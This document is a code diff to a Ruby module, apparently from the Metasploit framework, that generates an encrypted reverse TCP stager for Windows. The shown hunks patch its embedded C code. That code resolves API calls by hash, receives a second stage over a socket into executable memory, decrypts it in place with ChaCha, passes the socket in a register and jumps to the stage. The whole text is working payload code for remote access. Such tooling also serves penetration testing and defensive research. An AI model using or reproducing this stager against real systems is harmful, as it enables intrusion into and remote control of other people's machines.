@@ -177,12 +177,10 @@ module Payload::Windows::EncryptedReverseTcp
         chacha_keysetup(&ctx, KEY, 256, 96);
         chacha_ivsetup(&ctx, NONCE);
 
-        FuncGlobalAlloc GlobalAlloc = (FuncGlobalAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'GlobalAlloc')}); // hash('kernel32.dll', 'GlobalAlloc') -> 0x520f76f6
-        char *out = GlobalAlloc(GMEM_FIXED, sizeof(char) * (len + 1));
-        chacha_encrypt_bytes(&ctx, buf, out, len);
-        out[len] = '\\0';
+        chacha_encrypt_bytes(&ctx, buf, buf, len);
+        buf[len] = '\\0';
 
-        return out;
+        return buf;
       }
     ^
   end
@@ -426,7 +424,9 @@ module Payload::Windows::EncryptedReverseTcp
 
   def stager_comm
     reg = 'edi'
+    inst = 'movl'
     reg = 'rdi' unless self.arch_to_s.include?('x86')
+    inst = 'movq' unless self.arch_to_s.include?('x86')
 
     %Q^
         FuncRecv RecvData = (FuncRecv) GetProcAddressWithHash(#{get_hash('ws2_32.dll', 'recv')}); // hash('ws2_32.dll', 'recv') -> 0x5fc8d902
@@ -438,7 +438,7 @@ module Payload::Windows::EncryptedReverseTcp
         }
 
         FuncVirtualAlloc VirtualAlloc = (FuncVirtualAlloc) GetProcAddressWithHash(#{get_hash('kernel32.dll', 'VirtualAlloc')}); // hash('kernel32.dll', 'VirtualAlloc') -> 0xe553a458
-        register char *received = VirtualAlloc(NULL, stage_size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        register char *received = VirtualAlloc(NULL, stage_size + 1, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 
         int recv_stg = RecvData(conn_socket, received, stage_size, 0);
         if(recv_stg != stage_size)
@@ -446,16 +446,16 @@ module Payload::Windows::EncryptedReverseTcp
           ExitProcess(proc_term_status);
         }
 
-        char *stage = chacha_data(received, stage_size);
+        chacha_data(received, stage_size + 1);
         // hand the socket to the stage
-        asm("movl %0, %%#{reg}"
+        asm("#{inst} %0, %%#{reg}"
             :
             : "r" (conn_socket)
             : "%#{reg}"
         );
 
         // call the stage
-        void (*func)() = (void(*)())stage;
+        void (*func)() = (void(*)())received;
         func();
       }
     ^
@@ -463,14 +463,16 @@ module Payload::Windows::EncryptedReverseTcp
 
   def exec_payload_stage
     reg = 'edi'
-    reg = 'rdi' unless self.arch_to_s.include?('x86')
+    inst = 'movl'
+    reg = 'rdi' unless self.arch_to_s.eql?('x86')
+    inst = 'movq' unless self.arch_to_s.eql?('x86')
 
     %Q^
      void ExecutePayload()
      {
        SOCKET conn_socket = INVALID_SOCKET;
 
-       asm("movl %%#{reg}, %0"
+       asm("#{inst} %%#{reg}, %0"
            :
            :"m"(conn_socket)
        );
